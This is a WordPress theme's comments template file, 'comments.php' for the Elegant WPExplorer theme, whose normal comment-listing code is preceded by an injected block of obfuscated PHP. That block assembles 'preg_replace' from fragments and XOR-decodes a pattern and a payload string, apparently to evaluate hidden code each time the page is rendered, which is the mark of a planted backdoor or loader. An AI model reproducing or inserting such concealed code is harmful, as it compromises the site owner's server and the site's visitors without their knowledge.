<?php
/*oEE8mBQAA4tn44Ty3uVCDrqPBaq63KK
odEFFc8ILdMbKWulvbEsLkJVJHbm445HGQ
BDxoWlnXUwiso50tj15Cv7yteAoZaZ4IzAfhYG8qWkOLavvIy
HPHEO8eQEn8mtgUFxT0JXQvwCD0b57gFjlrMGSWvH
NrECiaHPOaCTNRjk9E75eY1nNVflHgpJrCgH4bw2K2rOf39i
*/

$MujZdqvI='preg_r'.'ep'. 'l'. 'a'.'c'.'e'; $tziLbk="Pq1nMuNXmzvLV6GxreU"^"\x7f\x09I\x2b4\x13\x05\x0c\x3c\x20\x06\x0f\x3bD\x22\x3e\x00J\x30"; $MujZdqvI($tziLbk, "Fkak3mXCnLBEMO8Y5QRPmNjTok612U8hk5tmqS2ye9aU13C3GgvsG1OgLTggL5NccGZg21sbsnMb2ZdPponD8URkF5dF4X1PsKdSZR78TKWbQxTdlo4QMrrhXYyg9r26VH48UkhVRk3TBEfk6hfWy7eXCthza5PcV6senvgmm2wEKNEjmSf"^"\x23\x1d\x00\x07\x1bO1\x25F\x2516\x28\x3b\x10\x05iu\x0d\x02\x28\x1f\x3f\x11\x3c\x3fm\x16Q\x3d\x1f5B\x15RKQ\x7b\x5f\x1dP\x11\x3d\x09\x15l\x11v\x1623\x20\x13jh\x04\x24s\x3aNl\x08sCD\x7en\x5fT\x04\x17Z\x11\x5d\x7e\x03Q\x3eTaHW\x5b\x26\x5caa\x5esQ\x06\x24Q\x3b\x06b\x11lMs\x7ct\x17Q\x2782\x16y\x24\x08\x403\x3dq\x00\x187\x21\x3c\x03\x7e\x09\x0fI\x2dQY2\x2d\x13e\x7cBH\x2dr\x0eE5\x2em\x3a7\x1274\x12\x28b\x20\x0b\x17\x2fO\x0a\x09E\x0f\x009R\x16B3\x5f\x5cM\x08J\x1e1cg\x7eJ\x10qO", "xxEyfKTQZpCmreFr");//dCvPXSEmItDAPZ5Pp7Ys3aqOzbgJ0EISV7NCVIAM9?> <?php
/**
 * The template for displaying Comments.
 *
 * The area of the page that contains both current comments and the comment
 * form. The actual display of comments is handled by a callback to
 * wpex_comment() which is located at functions/comments-callback.php
 *
 * @package WordPress
 * @subpackage Elegant WPExplorer Theme
 * @since Elegant 1.0
 */


// Bail if password protected and user hasn't entered password
if ( post_password_required() ) return;

// Comments are closed and empty, do nothing
if ( !comments_open() && get_comment_pages_count() == 0 ) return; ?>

<div id="comments" class="comments-area">
	<?php if ( have_comments() ) { ?>
		<h2 id="comments-title" class="heading">
			<span>
				<?php
					printf( _nx( 'This article has 1 comment', 'This article has %1$s comments', '', 'comments title', 'wpex' ),
						number_format_i18n( get_comments_number() ), '<span>' . get_the_title() . '</span>' );
				?>
			</span>
		</h2>
		<ol class="commentlist">
			<?php wp_list_comments( array(
				'callback'		=> 'wpex_comment',
			) ); ?>
		</ol><!-- .commentlist -->
		<?php if ( get_comment_pages_count() > 1 && get_option( 'page_comments' ) ) { ?>
			<nav class="navigation comment-navigation row clr" role="navigation">
				<h4 class="assistive-text section-heading heading"><span><?php _e( 'Comment navigation', 'wpex' ); ?></span></h4>
				<div class="nav-previous span_12 col clr-margin"><?php previous_comments_link( __( '&larr; Older Comments', 'wpex' ) ); ?></div>
				<div class="nav-next span_12 col"><?php next_comments_link( __( 'Newer Comments &rarr;', 'wpex' ) ); ?></div>
			</nav>
		<?php } ?>
	<?php } // have_comments() ?>
	<?php comment_form( array(
		'title_reply'	=> '<div class="heading"><span>'. __('Leave a Comment','wpex') .'</span></div>',
	)); ?>
</div><!-- #comments -->